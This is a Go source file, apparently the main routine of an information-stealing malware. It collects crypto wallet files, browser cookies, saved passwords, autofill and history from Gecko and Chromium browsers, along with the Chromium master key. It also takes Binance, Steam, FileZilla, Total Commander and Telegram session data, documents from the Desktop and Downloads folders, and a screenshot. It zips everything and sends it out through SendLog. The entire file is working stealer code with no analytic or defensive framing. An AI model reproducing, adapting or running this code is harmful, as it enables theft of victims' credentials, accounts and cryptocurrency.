package main

import (
	"archive/zip"
	"bytes"
	"image/jpeg"
	"os"
	"strconv"
	"strings"
)

func main() {
	buf := new(bytes.Buffer)
	writer := zip.NewWriter(buf)
	i := 0
	s := 0

	if DESKTOP_WALLETS != "off" {
		for _, w := range CRYPTO_SLICE {
			wname := CRYPTO_NAMES[i]
			i++
			if wf, err := os.ReadDir(w); err == nil {
				for _, fw := range wf {
					if fww, err := os.ReadFile(w + "/" + fw.Name()); err == nil {
						if wff, err := writer.Create("Wallets/" + wname + "/" + fw.Name()); err == nil {
							wff.Write(fww)
						}
					}
				}
			}
		}
	}

	if installedsoft := InstalledSoftware(); len(installedsoft) > 0 {
		if ifw, err := writer.Create("InstalledSoftware.txt"); err == nil {
			for _, s := range installedsoft {
				ifw.Write([]byte(s))
			}
		}
	}

	if infow, err := writer.Create("Info.txt"); err == nil {
		infow.Write([]byte(ID + "\n" + TAG + "\n" + DOMAINDETECTS))
	}

	i = 0
	for _, ff := range GECKO_BROWSERS {
		browser_name := GECKO_NAMES[i]
		i++
		if _, err := os.ReadDir(ff); err == nil {
			cookies, autofills, historys := GeckoBrowser(ff)
			if len(cookies) > 0 {
				s = 0
				for _, c := range cookies {
					if cf, err := os.ReadFile(c); err == nil {
						if cw, err := writer.Create("Gecko/" + browser_name + "/Cookies" + strconv.Itoa(s)); err == nil {
							s++
							cw.Write(cf)
						}
					}
				}
			}

			if len(autofills) > 0 {
				s = 0
				for _, a := range autofills {
					if af, err := os.ReadFile(a); err == nil {
						if aw, err := writer.Create("Gecko/" + browser_name + "/Autofill" + strconv.Itoa(s)); err == nil {
							s++
							aw.Write(af)
						}
					}
				}
			}

			if len(historys) > 0 {
				s = 0
				for _, h := range historys {
					if hf, err := os.ReadFile(h); err == nil {
						if hw, err := writer.Create("Gecko/" + browser_name + "/History" + strconv.Itoa(s)); err == nil {
							s++
							hw.Write(hf)
						}
					}
				}
			}
		}
	}

	for _, browser := range CHROMIUM_BROWSERS {
		browser_name := CHROMIUM_NAMES[i]
		i++
		if _, err := os.ReadDir(browser); err == nil {
			wallets, plugins, cookies, passwords, historys, autofills, locals := ChromiumBrowser(browser)
			if len(wallets) > 0 {
				for _, w := range wallets {
					s++
					if dw, err := os.ReadDir(w.WalletPath); err == nil {
						for _, fw := range dw {
							if flw, err := os.ReadFile(w.WalletPath + "/" + fw.Name()); err == nil {
								if wfw, err := writer.Create("Wallets/" + browser_name + "_" + w.WalletName + strconv.Itoa(s) + "/" + fw.Name()); err == nil {
									wfw.Write(flw)
								}
							}
						}
					}
				}
			}
			if PLUGINS_CONF != "off" {
				size := []byte{}
				if len(plugins) > 0 {
					for _, p := range plugins {
						if pld, err := os.ReadDir(p.PluginPath); err == nil {
							for _, plf := range pld {
								if plr, err := os.ReadFile(p.PluginPath + "/" + plf.Name()); err == nil {
									size = append(size, plr...)
									if len(size) > 5242880 {
										break
									}
									if plw, err := writer.Create("Plugins/" + p.PluginName + "/" + plf.Name()); err == nil {
										plw.Write(plr)
									}
								}
							}
						}
					}
				}
			}
			if len(locals) > 0 {
				if len(cookies) > 0 {
					s = 0
					for _, d := range cookies {
						if cf, err := os.ReadFile(d); err == nil {
							if cw, err := writer.Create("Chromium/" + browser_name + "/Cookies" + strconv.Itoa(s)); err == nil {
								s++
								cw.Write(cf)
							}
						}
					}
				}

				if len(passwords) > 0 {
					s = 0
					for _, d := range passwords {
						if cf, err := os.ReadFile(d); err == nil {
							if cw, err := writer.Create("Chromium/" + browser_name + "/Passwords" + strconv.Itoa(s)); err == nil {
								s++
								cw.Write(cf)
							}
						}
					}
				}
				s = 0
				for _, lc := range locals {
					if lcc, err := GetMasterKey(lc); err == 0 {
						if w, err := writer.Create("Chromium/" + browser_name + "/Local State" + strconv.Itoa(s)); err == nil {
							s++
							w.Write(lcc)
						}
					}
				}
			}

			if len(historys) > 0 {
				s = 0
				for _, h := range historys {
					if hr, err := os.ReadFile(h); err == nil {
						if hw, err := writer.Create("Chromium/" + browser_name + "/History" + strconv.Itoa(s)); err == nil {
							s++
							hw.Write(hr)
						}
					}
				}
			}

			if len(autofills) > 0 {
				s = 0
				for _, af := range autofills {
					if fa, err := os.ReadFile(af); err == nil {
						if aw, err := writer.Create("Chromium/" + browser_name + "/Autofill" + strconv.Itoa(s)); err == nil {
							s++
							aw.Write(fa)
						}
					}
				}
			}
		}
	}
	if BINANCE_CONF != "off" {
		if binance, err := os.ReadFile(APPDATA + "/Binance/app-store.json"); err == nil {
			if bw, err := writer.Create("Wallets/app-store.json"); err == nil {
				bw.Write(binance)
			}
		}
	}

	if STEAM_CONF != "off" {
		ssfn, config := GrabSteam("C:/Program Files (x86)/Steam/", "C:/Program Files (x86)/Steam/config/")
		if len(ssfn) > 0 {
			for _, s := range ssfn {
				if wfw, err := os.ReadFile(s.Pather); err == nil {
					if wsw, err := writer.Create(s.Filename); err == nil {
						wsw.Write(wfw)
					}
				}
			}
		}

		if len(config) > 0 {
			for _, c := range config {
				if fwf, err := os.ReadFile(c.Pather); err == nil {
					if fwc, err := writer.Create(c.Filename); err == nil {
						fwc.Write(fwf)
					}
				}
			}
		}
	}
	if WALLETS_CORE != "off" {
		wallets := []WalletCore{}
		if alldirs, err := os.ReadDir(APPDATA); err == nil {
			s = 0
			for _, dirs := range alldirs {
				if dir, err := os.ReadDir(APPDATA + "/" + dirs.Name()); err == nil {
					for _, d := range dir {
						if strings.Index(d.Name(), "wallet") != -1 && !d.IsDir() {
							if fff, err := os.ReadFile(APPDATA + "/" + dirs.Name() + "/" + d.Name()); err == nil {
								c := WalletCore{dirs.Name(), d.Name() + strconv.Itoa(s), fff}
								s++
								wallets = append(wallets, c)
							}
						}
						if d.IsDir() {
							if dd, err := os.ReadDir(APPDATA + "/" + dirs.Name() + "/" + d.Name()); err == nil {
								for _, ddd := range dd {
									if strings.Index(ddd.Name(), "wallet") != -1 && !ddd.IsDir() {
										if fff, err := os.ReadFile(APPDATA + "/" + dirs.Name() + "/" + d.Name() + "/" + ddd.Name()); err == nil {
											c := WalletCore{dirs.Name(), ddd.Name() + strconv.Itoa(s), fff}
											s++
											wallets = append(wallets, c)
										}
									}
								}
							}
						}
					}
				}
			}
		}

		if len(wallets) > 0 {
			for _, w := range wallets {
				if ww, err := writer.Create("Wallets/" + w.WalletName + "/" + w.Filename); err == nil {
					ww.Write(w.File)
				}
			}
		}
	}

	if FTP_CONF != "off" {
		if filezilla, err := os.ReadFile(FILEZILLA); err == nil {
			if wf, err := writer.Create("FTP/FZ/recentservers.xml"); err == nil {
				wf.Write(filezilla)
			}
		}

		if totalcommander, err := os.ReadFile(TOTALCOMMANDER); err == nil {
			if wf, err := writer.Create("FTP/TM/wcx_ftp.ini"); err == nil {
				wf.Write(totalcommander)
			}
		}
	}
	path_to := USERPATH + "/Desktop"
	if GRABPATH != "off" {
		path_to = GRABPATH
	}
	if filegrabber := GrabFiles(path_to, strings.Split(GRABEXTS, ",")); len(filegrabber) > 0 {
		for _, f := range filegrabber {
			if ff, err := os.ReadFile(f.Filepather); err == nil {
				if filee, err := writer.Create("FileGrabber/" + f.Name); err == nil {
					filee.Write(ff)
				}
			}
		}
	}

	if download := Downloads(); len(download) > 0 {
		for _, d := range download {
			if ff, err := os.ReadFile(d.Filepather); err == nil {
				if filee, err := writer.Create("FileGrabber/" + d.Name); err == nil {
					filee.Write(ff)
				}
			}
		}
	}

	if TELEGERAM_CONF != "off" {
		if files, err := os.ReadDir(TELEGRAM); err == nil {
			slicename := []string{}
			for _, file := range files {
				if file.IsDir() {
					dir, err := os.ReadDir(TELEGRAM + file.Name())
					if err == nil {
						for _, tgs := range dir {
							if tgs.Name() == "maps" {
								readfile, err := os.ReadFile(TELEGRAM + file.Name() + "/maps")
								slicename = append(slicename, file.Name())
								if err == nil {
									file, err := writer.Create("tdata/" + file.Name() + "/maps")
									if err == nil {
										file.Write(readfile)
									}
								}
							}
						}
					}
				}
			}

			if len(slicename) > 0 {
				for _, file := range files {
					if file.Name() == "key_datas" {
						if filee, err := os.ReadFile(TELEGRAM + file.Name()); err == nil {
							if filef, err := writer.Create("tdata/key_datas"); err == nil {
								filef.Write(filee)
							}
						}
					}
					for _, name := range slicename {
						if file.Name() == name+"s" && !file.IsDir() {
							if filee, err := os.ReadFile(TELEGRAM + file.Name()); err == nil {
								filef, err := writer.Create("tdata/" + file.Name())
								if err == nil {
									filef.Write(filee)
								}
							}
						}
					}
				}
			}
		}
	}

	if screenshot, imgerr, x, y := CaptureScreen(); imgerr == 0 {
		if screen, err := writer.Create("Screenshot.jpeg"); err == nil {
			jpeg.Encode(screen, screenshot, nil)
		}

		if userinfo := GetUserInformation(strconv.Itoa(x) + "x" + strconv.Itoa(y)); userinfo != "" {
			if file, err := writer.Create("Usinfo.txt"); err == nil {
				file.Write([]byte(userinfo))
			}
		}
	}

	writer.Close()
	SendLog(buf.Bytes(), ID)
}
